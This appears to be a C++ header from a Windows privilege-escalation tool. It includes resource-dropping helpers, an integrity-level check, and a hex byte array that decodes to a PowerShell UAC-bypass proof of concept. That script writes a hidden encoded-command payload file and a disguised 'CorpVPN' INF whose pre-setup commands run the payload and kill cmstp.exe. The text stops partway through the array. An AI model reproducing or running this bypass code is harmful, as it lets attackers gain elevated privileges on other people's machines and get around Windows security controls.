#pragma once

#include "UAC.h"



void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), rsrcName);
    DWORD dllSize = SizeofResource(hMod, res);
    void* dllBuff = LoadResource(hMod, res);
    HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
    DWORD sizeOut;
    WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
    CloseHandle(hDll);
}

void fileFromBuf(const wchar_t* filePath, const void* buf, DWORD size) {
    DWORD sizeOut;
    HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
    WriteFile(hFile, buf, size, &sizeOut, NULL);
    CloseHandle(hFile);
    return;
}

DWORD GetProcessIntegrityLevel()
{
    DWORD dwIntegrityLevel = 0;
    DWORD dwError = ERROR_SUCCESS;
    HANDLE hToken = NULL;
    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;

    // Open the primary access token of the process with TOKEN_QUERY.
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    // Query the size of the token integrity level information. Note that 
    // we expect a FALSE result and the last error ERROR_INSUFFICIENT_BUFFER
    // from GetTokenInformation because we have given it a NULL buffer. On 
    // exit cbTokenIL will tell the size of the integrity level information.
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
    {
        if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
        {
            // When the process is run on operating systems prior to Windows 
            // Vista, GetTokenInformation returns FALSE with the 
            // ERROR_INVALID_PARAMETER error code because TokenElevation 
            // is not supported on those operating systems.
            dwError = GetLastError();
            goto Cleanup;
        }
    }

    // Now we allocate a buffer for the integrity level information.
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    if (pTokenIL == NULL)
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    // Retrieve token integrity level information.
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL,
        cbTokenIL, &cbTokenIL))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    // Integrity Level SIDs are in the form of S-1-16-0xXXXX. (e.g. 
    // S-1-16-0x1000 stands for low integrity level SID). There is one and 
    // only one subauthority.
    dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

Cleanup:
    // Centralized cleanup for all allocated resources.
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    if (pTokenIL)
    {
        LocalFree(pTokenIL);
        pTokenIL = NULL;
        cbTokenIL = 0;
    }

    // Throw the error if something failed in the function.
    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return dwIntegrityLevel;
}

BOOL IsHightLevel() {
    DWORD integrity_level = GetProcessIntegrityLevel();
    switch (integrity_level)
    {
    case SECURITY_MANDATORY_UNTRUSTED_RID: std::cout << "Integrity Level: Untrusted\n" << std::endl; break;
    case SECURITY_MANDATORY_LOW_RID: std::cout << "Integrity Level: Low\n" << std::endl; break;
    case SECURITY_MANDATORY_MEDIUM_RID: std::cout << "Integrity Level: Medium\n" << std::endl; break;
    case SECURITY_MANDATORY_HIGH_RID: std::cout << "Integrity Level: High\n" << std::endl; break;
    case SECURITY_MANDATORY_SYSTEM_RID: std::cout << "Integrity Level: System\n" << std::endl; break;
    default: std::cout << "Integrity Level: Unknown\n" << std::endl; break;
    }

    // system("pause");


    if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
        return true;

    return false;

}

unsigned char hexData[4516] = {
    0x23, 0x20, 0x55, 0x41, 0x43, 0x20, 0x42, 0x79,
    0x70, 0x61, 0x73, 0x73, 0x20, 0x70, 0x6F, 0x63,
    0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53,
    0x65, 0x6E, 0x64, 0x4B, 0x65, 0x79, 0x73, 0x0D,
    0x0A, 0x23, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69,
    0x6F, 0x6E, 0x20, 0x31, 0x2E, 0x30, 0x0D, 0x0A,
    0x23, 0x20, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72,
    0x3A, 0x20, 0x4F, 0x64, 0x64, 0x76, 0x61, 0x72,
    0x20, 0x4D, 0x6F, 0x65, 0x0D, 0x0A, 0x23, 0x20,
    0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x73, 0x20, 0x62, 0x6F, 0x72, 0x72, 0x6F, 0x77,
    0x65, 0x64, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x3A,
    0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F,
    0x2F, 0x70, 0x6F, 0x77, 0x65, 0x72, 0x73, 0x68,
    0x65, 0x6C, 0x6C, 0x2E, 0x6F, 0x72, 0x67, 0x2F,
    0x66, 0x6F, 0x72, 0x75, 0x6D, 0x73, 0x2F, 0x74,
    0x6F, 0x70, 0x69, 0x63, 0x2F, 0x73, 0x65, 0x6E,
    0x64, 0x6B, 0x65, 0x79, 0x73, 0x2F, 0x0D, 0x0A,
    0x23, 0x20, 0x54, 0x6F, 0x64, 0x6F, 0x3A, 0x20,
    0x48, 0x69, 0x64, 0x65, 0x20, 0x77, 0x69, 0x6E,
    0x64, 0x6F, 0x77, 0x20, 0x6F, 0x6E, 0x20, 0x73,
    0x63, 0x72, 0x65, 0x65, 0x6E, 0x20, 0x66, 0x6F,
    0x72, 0x20, 0x73, 0x74, 0x65, 0x61, 0x6C, 0x74,
    0x68, 0x0D, 0x0A, 0x23, 0x20, 0x54, 0x6F, 0x64,
    0x6F, 0x3A, 0x20, 0x4D, 0x61, 0x6B, 0x65, 0x20,
    0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x20, 0x65,
    0x64, 0x69, 0x74, 0x20, 0x74, 0x68, 0x65, 0x20,
    0x49, 0x4E, 0x46, 0x20, 0x66, 0x69, 0x6C, 0x65,
    0x20, 0x66, 0x6F, 0x72, 0x20, 0x63, 0x6F, 0x6D,
    0x6D, 0x61, 0x6E, 0x64, 0x20, 0x74, 0x6F, 0x20,
    0x69, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x2E, 0x2E,
    0x2E, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x24, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x0D, 0x0A, 0x23,
    0x57, 0x41, 0x52, 0x4E, 0x49, 0x4E, 0x47, 0x20,
    0x2D, 0x20, 0x54, 0x68, 0x69, 0x73, 0x20, 0x73,
    0x63, 0x72, 0x69, 0x70, 0x74, 0x20, 0x77, 0x69,
    0x6C, 0x6C, 0x20, 0x64, 0x72, 0x6F, 0x70, 0x20,
    0x32, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x73, 0x20,
    0x6F, 0x6E, 0x20, 0x64, 0x69, 0x73, 0x6B, 0x20,
    0x69, 0x6E, 0x20, 0x63, 0x3A, 0x5C, 0x75, 0x73,
    0x65, 0x72, 0x73, 0x5C, 0x70, 0x75, 0x62, 0x6C,
    0x69, 0x63, 0x5C, 0x64, 0x6F, 0x77, 0x6E, 0x6C,
    0x6F, 0x61, 0x64, 0x73, 0x23, 0x0D, 0x0A, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
    0x23, 0x23, 0x23, 0x23, 0x23, 0x0D, 0x0A, 0x0D,
    0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x23, 0x20, 0x49,
    0x6E, 0x73, 0x65, 0x72, 0x74, 0x20, 0x50, 0x6F,
    0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C,
    0x20, 0x50, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64,
    0x20, 0x68, 0x65, 0x72, 0x65, 0x0D, 0x0A, 0x24,
    0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x20,
    0x3D, 0x20, 0x22, 0x70, 0x6F, 0x77, 0x65, 0x72,
    0x73, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x65, 0x78,
    0x65, 0x20, 0x2D, 0x77, 0x20, 0x68, 0x69, 0x64,
    0x64, 0x65, 0x6E, 0x20, 0x2D, 0x6E, 0x6F, 0x70,
    0x20, 0x2D, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x65,
    0x64, 0x63, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64,
    0x20, 0x4A, 0x41, 0x42, 0x69, 0x2E, 0x2E, 0x2E,
    0x2E, 0x2E, 0x22, 0x0D, 0x0A, 0x0D, 0x0A, 0x23,
    0x20, 0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x20,
    0x77, 0x68, 0x65, 0x72, 0x65, 0x20, 0x74, 0x68,
    0x65, 0x20, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61,
    0x64, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x62,
    0x65, 0x20, 0x73, 0x74, 0x6F, 0x72, 0x65, 0x64,
    0x0D, 0x0A, 0x24, 0x70, 0x61, 0x79, 0x6C, 0x6F,
    0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x20, 0x3D,
    0x20, 0x22, 0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65,
    0x72, 0x73, 0x5C, 0x50, 0x75, 0x62, 0x6C, 0x69,
    0x63, 0x5C, 0x44, 0x6F, 0x77, 0x6E, 0x6C, 0x6F,
    0x61, 0x64, 0x73, 0x5C, 0x70, 0x61, 0x79, 0x6C,
    0x6F, 0x61, 0x64, 0x2E, 0x70, 0x73, 0x31, 0x22,
    0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x69, 0x66,
    0x20, 0x28, 0x54, 0x65, 0x73, 0x74, 0x2D, 0x50,
    0x61, 0x74, 0x68, 0x20, 0x24, 0x70, 0x61, 0x79,
    0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63,
    0x20, 0x2D, 0x50, 0x61, 0x74, 0x68, 0x54, 0x79,
    0x70, 0x65, 0x20, 0x6C, 0x65, 0x61, 0x66, 0x29,
    0x0D, 0x0A, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x52, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x2D,
    0x49, 0x74, 0x65, 0x6D, 0x20, 0x24, 0x70, 0x61,
    0x79, 0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C, 0x6F,
    0x63, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x4E,
    0x65, 0x77, 0x2D, 0x49, 0x74, 0x65, 0x6D, 0x20,
    0x2D, 0x50, 0x61, 0x74, 0x68, 0x20, 0x24, 0x70,
    0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C,
    0x6F, 0x63, 0x20, 0x2D, 0x49, 0x74, 0x65, 0x6D,
    0x54, 0x79, 0x70, 0x65, 0x20, 0x46, 0x69, 0x6C,
    0x65, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x24, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64,
    0x20, 0x7C, 0x20, 0x4F, 0x75, 0x74, 0x2D, 0x46,
    0x69, 0x6C, 0x65, 0x20, 0x24, 0x70, 0x61, 0x79,
    0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x23, 0x48,
    0x69, 0x64, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x68,
    0x65, 0x20, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61,
    0x64, 0x20, 0x50, 0x6F, 0x77, 0x65, 0x72, 0x73,
    0x68, 0x65, 0x6C, 0x6C, 0x20, 0x66, 0x69, 0x6C,
    0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x23,
    0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x20, 0x2B,
    0x68, 0x20, 0x24, 0x70, 0x61, 0x79, 0x6C, 0x6F,
    0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x0D, 0x0A,
    0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x0D,
    0x0A, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x4E, 0x65, 0x77, 0x2D, 0x49, 0x74, 0x65, 0x6D,
    0x20, 0x2D, 0x50, 0x61, 0x74, 0x68, 0x20, 0x24,
    0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x5F,
    0x6C, 0x6F, 0x63, 0x20, 0x2D, 0x49, 0x74, 0x65,
    0x6D, 0x54, 0x79, 0x70, 0x65, 0x20, 0x46, 0x69,
    0x6C, 0x65, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x24, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61,
    0x64, 0x20, 0x7C, 0x20, 0x4F, 0x75, 0x74, 0x2D,
    0x46, 0x69, 0x6C, 0x65, 0x20, 0x24, 0x70, 0x61,
    0x79, 0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C, 0x6F,
    0x63, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x23,
    0x48, 0x69, 0x64, 0x69, 0x6E, 0x67, 0x20, 0x74,
    0x68, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6C, 0x6F,
    0x61, 0x64, 0x20, 0x50, 0x6F, 0x77, 0x65, 0x72,
    0x73, 0x68, 0x65, 0x6C, 0x6C, 0x20, 0x66, 0x69,
    0x6C, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x23, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x20,
    0x2B, 0x68, 0x20, 0x24, 0x70, 0x61, 0x79, 0x6C,
    0x6F, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x0D,
    0x0A, 0x7D, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A,
    0x24, 0x70, 0x61, 0x79, 0x5F, 0x65, 0x78, 0x65,
    0x63, 0x20, 0x3D, 0x20, 0x27, 0x3B, 0x20, 0x4E,
    0x6F, 0x20, 0x6C, 0x6F, 0x6E, 0x67, 0x65, 0x72,
    0x20, 0x6E, 0x65, 0x65, 0x64, 0x65, 0x64, 0x20,
    0x2D, 0x20, 0x65, 0x6D, 0x62, 0x65, 0x64, 0x64,
    0x65, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x73, 0x63,
    0x72, 0x69, 0x70, 0x74, 0x20, 0x6E, 0x6F, 0x77,
    0x0D, 0x0A, 0x5B, 0x76, 0x65, 0x72, 0x73, 0x69,
    0x6F, 0x6E, 0x5D, 0x0D, 0x0A, 0x53, 0x69, 0x67,
    0x6E, 0x61, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x24,
    0x63, 0x68, 0x69, 0x63, 0x61, 0x67, 0x6F, 0x24,
    0x0D, 0x0A, 0x41, 0x64, 0x76, 0x61, 0x6E, 0x63,
    0x65, 0x64, 0x49, 0x4E, 0x46, 0x3D, 0x32, 0x2E,
    0x35, 0x0D, 0x0A, 0x0D, 0x0A, 0x5B, 0x44, 0x65,
    0x66, 0x61, 0x75, 0x6C, 0x74, 0x49, 0x6E, 0x73,
    0x74, 0x61, 0x6C, 0x6C, 0x5D, 0x0D, 0x0A, 0x43,
    0x75, 0x73, 0x74, 0x6F, 0x6D, 0x44, 0x65, 0x73,
    0x74, 0x69, 0x6E, 0x61, 0x74, 0x69, 0x6F, 0x6E,
    0x3D, 0x43, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x73,
    0x74, 0x44, 0x65, 0x73, 0x74, 0x53, 0x65, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x41, 0x6C, 0x6C, 0x55,
    0x73, 0x65, 0x72, 0x73, 0x0D, 0x0A, 0x52, 0x75,
    0x6E, 0x50, 0x72, 0x65, 0x53, 0x65, 0x74, 0x75,
    0x70, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64,
    0x73, 0x3D, 0x52, 0x75, 0x6E, 0x50, 0x72, 0x65,
    0x53, 0x65, 0x74, 0x75, 0x70, 0x43, 0x6F, 0x6D,
    0x6D, 0x61, 0x6E, 0x64, 0x73, 0x53, 0x65, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x0D, 0x0A, 0x0D, 0x0A,
    0x5B, 0x52, 0x75, 0x6E, 0x50, 0x72, 0x65, 0x53,
    0x65, 0x74, 0x75, 0x70, 0x43, 0x6F, 0x6D, 0x6D,
    0x61, 0x6E, 0x64, 0x73, 0x53, 0x65, 0x63, 0x74,
    0x69, 0x6F, 0x6E, 0x5D, 0x0D, 0x0A, 0x3B, 0x20,
    0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x73,
    0x20, 0x48, 0x65, 0x72, 0x65, 0x20, 0x77, 0x69,
    0x6C, 0x6C, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75,
    0x6E, 0x20, 0x42, 0x65, 0x66, 0x6F, 0x72, 0x65,
    0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x20, 0x42,
    0x65, 0x67, 0x69, 0x6E, 0x73, 0x20, 0x74, 0x6F,
    0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C,
    0x0D, 0x0A, 0x3B, 0x43, 0x3A, 0x5C, 0x57, 0x69,
    0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x53, 0x79,
    0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x63,
    0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A,
    0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x73,
    0x5C, 0x61, 0x64, 0x6D, 0x69, 0x6E, 0x5C, 0x44,
    0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x70,
    0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x6C,
    0x61, 0x62, 0x33, 0x2E, 0x65, 0x78, 0x65, 0x0D,
    0x0A, 0x3B, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E,
    0x64, 0x6F, 0x77, 0x73, 0x5C, 0x53, 0x79, 0x73,
    0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x57, 0x69,
    0x6E, 0x64, 0x6F, 0x77, 0x73, 0x50, 0x6F, 0x77,
    0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x5C,
    0x76, 0x31, 0x2E, 0x30, 0x5C, 0x70, 0x6F, 0x77,
    0x65, 0x72, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x2E,
    0x65, 0x78, 0x65, 0x20, 0x43, 0x3A, 0x5C, 0x55,
    0x73, 0x65, 0x72, 0x73, 0x5C, 0x50, 0x75, 0x62,
    0x6C, 0x69, 0x63, 0x5C, 0x44, 0x6F, 0x77, 0x6E,
    0x6C, 0x6F, 0x61, 0x64, 0x73, 0x2E, 0x5C, 0x70,
    0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x2E, 0x70,
    0x73, 0x31, 0x0D, 0x0A, 0x74, 0x61, 0x73, 0x6B,
    0x6B, 0x69, 0x6C, 0x6C, 0x20, 0x2F, 0x49, 0x4D,
    0x20, 0x63, 0x6D, 0x73, 0x74, 0x70, 0x2E, 0x65,
    0x78, 0x65, 0x20, 0x2F, 0x46, 0x0D, 0x0A, 0x0D,
    0x0A, 0x5B, 0x43, 0x75, 0x73, 0x74, 0x49, 0x6E,
    0x73, 0x74, 0x44, 0x65, 0x73, 0x74, 0x53, 0x65,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x41, 0x6C, 0x6C,
    0x55, 0x73, 0x65, 0x72, 0x73, 0x5D, 0x0D, 0x0A,
    0x34, 0x39, 0x30, 0x30, 0x30, 0x2C, 0x34, 0x39,
    0x30, 0x30, 0x31, 0x3D, 0x41, 0x6C, 0x6C, 0x55,
    0x53, 0x65, 0x72, 0x5F, 0x4C, 0x44, 0x49, 0x44,
    0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2C,
    0x20, 0x37, 0x0D, 0x0A, 0x0D, 0x0A, 0x5B, 0x41,
    0x6C, 0x6C, 0x55, 0x53, 0x65, 0x72, 0x5F, 0x4C,
    0x44, 0x49, 0x44, 0x53, 0x65, 0x63, 0x74, 0x69,
    0x6F, 0x6E, 0x5D, 0x0D, 0x0A, 0x22, 0x48, 0x4B,
    0x4C, 0x4D, 0x22, 0x2C, 0x20, 0x22, 0x53, 0x4F,
    0x46, 0x54, 0x57, 0x41, 0x52, 0x45, 0x5C, 0x4D,
    0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74,
    0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73,
    0x5C, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
    0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x5C,
    0x41, 0x70, 0x70, 0x20, 0x50, 0x61, 0x74, 0x68,
    0x73, 0x5C, 0x43, 0x4D, 0x4D, 0x47, 0x52, 0x33,
    0x32, 0x2E, 0x45, 0x58, 0x45, 0x22, 0x2C, 0x20,
    0x22, 0x50, 0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65,
    0x49, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x50,
    0x61, 0x74, 0x68, 0x22, 0x2C, 0x20, 0x22, 0x25,
    0x55, 0x6E, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x25,
    0x22, 0x2C, 0x20, 0x22, 0x22, 0x0D, 0x0A, 0x0D,
    0x0A, 0x5B, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
    0x73, 0x5D, 0x0D, 0x0A, 0x53, 0x65, 0x72, 0x76,
    0x69, 0x63, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x3D,
    0x22, 0x43, 0x6F, 0x72, 0x70, 0x56, 0x50, 0x4E,
    0x22, 0x0D, 0x0A, 0x53, 0x68, 0x6F, 0x72, 0x74,
    0x53, 0x76, 0x63, 0x4E, 0x61, 0x6D, 0x65, 0x3D,
    0x22, 0x43, 0x6F, 0x72, 0x70, 0x56, 0x50, 0x4E,
    0x22, 0x27, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A,
    0x0D, 0x0A, 0x24, 0x70, 0x61, 0x79, 0x5F, 0x6C,
    0x6F, 0x63, 0x20, 0x3D, 0x20, 0x22, 0x43, 0x3A,
    0x5C, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x50,
    0x75, 0x62, 0x6C, 0x69, 0x63, 0x5C, 0x44, 0x6F,
    0x77, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x73, 0x5C,
    0x43, 0x6F, 0x72, 0x70, 0x56, 0x50, 0x4E, 0x2E,
    0x69, 0x6E, 0x66, 0x22, 0x0D, 0x0A, 0x0D, 0x0A,
    0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x54, 0x65,
    0x73, 0x74, 0x2D, 0x50, 0x61, 0x74, 0x68, 0x20,
    0x24, 0x70, 0x61, 0x79, 0x5F, 0x6C, 0x6F, 0x63,
    0x20, 0x2D, 0x50, 0x61, 0x74, 0x68, 0x54, 0x79,
    0x70, 0x65, 0x20, 0x6C, 0x65, 0x61, 0x66, 0x29,
    0x0D, 0x0A, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x52, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x2D,
    0x49, 0x74, 0x65, 0x6D, 0x20, 0x24, 0x70, 0x61,
    0x79, 0x5F, 0x6C, 0x6F, 0x63, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x20, 0x4E, 0x65, 0x77, 0x2D, 0x49,
    0x74, 0x65, 0x6D, 0x20, 0x2D, 0x50, 0x61, 0x74,
    0x68, 0x20, 0x24, 0x70, 0x61, 0x79, 0x5F, 0x6C,
    0x6F, 0x63, 0x20, 0x2D, 0x49, 0x74, 0x65, 0x6D,
    0x54, 0x79, 0x70, 0x65, 0x20, 0x46, 0x69, 0x6C,
    0x65, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x24, 0x70, 0x61, 0x79, 0x5F, 0x65, 0x78, 0x65,
    0x63, 0x20, 0x7C, 0x20, 0x4F, 0x75, 0x74, 0x2D,
    0x46, 0x69, 0x6C, 0x65, 0x20, 0x24, 0x70, 0x61,
    0x79, 0x5F, 0x6C, 0x6F, 0x63, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x20, 0x23, 0x48, 0x69, 0x64, 0x69,
    0x6E, 0x67, 0x20, 0x74, 0x68, 0x65, 0x20, 0x66,
    0x69, 0x6C, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x23, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62,
    0x20, 0x2B, 0x68, 0x20, 0x24, 0x70, 0x61, 0x79,
    0x5F, 0x6C, 0x6F, 0x63, 0x0D, 0x0A, 0x7D, 0x0D,
    0x0A, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x0D,
    0x0A, 0x0D, 0x0A, 0x7B, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x4E, 0x65, 0x77, 0x2D, 0x49, 0x74,
    0x65, 0x6D, 0x20, 0x2D, 0x50, 0x61, 0x74, 0x68,
    0x20, 0x24, 0x70, 0x61, 0x79, 0x5F, 0x6C, 0x6F,
    0x63, 0x20, 0x2D, 0x49, 0x74, 0x65, 0x6D, 0x54,
    0x79, 0x70, 0x65, 0x20, 0x46, 0x69, 0x6C, 0x65,
    0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x24,
    0x70, 0x61, 0x79, 0x5F, 0x65, 0x78, 0x65, 0x63,
    0x20, 0x7C, 0x20, 0x4F, 0x75, 0x74, 0x2D, 0x46,
    0x69, 0x6C, 0x65, 0x20, 0x24, 0x70, 0x61, 0x79,
    0x5F, 0x6C, 0x6F, 0x63, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x23, 0x48, 0x69, 0x64, 0x69, 0x6E,
    0x67, 0x20, 0x74, 0x68, 0x65, 0x20, 0x66, 0x69,
    0x6C, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x23, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x20,
    0x2B, 0x68, 0x20, 0x24, 0x70, 0x61, 0x79, 0x5F,
    0x6C, 0x6F, 0x63, 0x0D, 0x0A, 0x0D, 0x0A, 0x7D,
    0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A,
    0x0D, 0x0A, 0x24, 0x49, 0x6E, 0x66, 0x46, 0x69,
    0x6C, 0x65, 0x20, 0x3D, 0x20, 0x22, 0x43, 0x3A,
    0x5C, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x50,
    0x75, 0x62, 0x6C, 0x69, 0x63, 0x5C, 0x44, 0x6F,
    0x77, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x73, 0x5C,
    0x43, 0x6F, 0x72, 0x70, 0x56, 0x50, 0x4E, 0x2E,
    0x69, 0x6E, 0x66, 0x22, 0x0D, 0x0A, 0x0D, 0x0A,
    0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x20, 0x47, 0x65, 0x74, 0x2D, 0x48, 0x77, 0x6E,
    0x64, 0x0D, 0x0A, 0x7B, 0x0D, 0x0A, 0x20, 0x20,
    0x5B, 0x43, 0x6D, 0x64, 0x6C, 0x65, 0x74, 0x42,
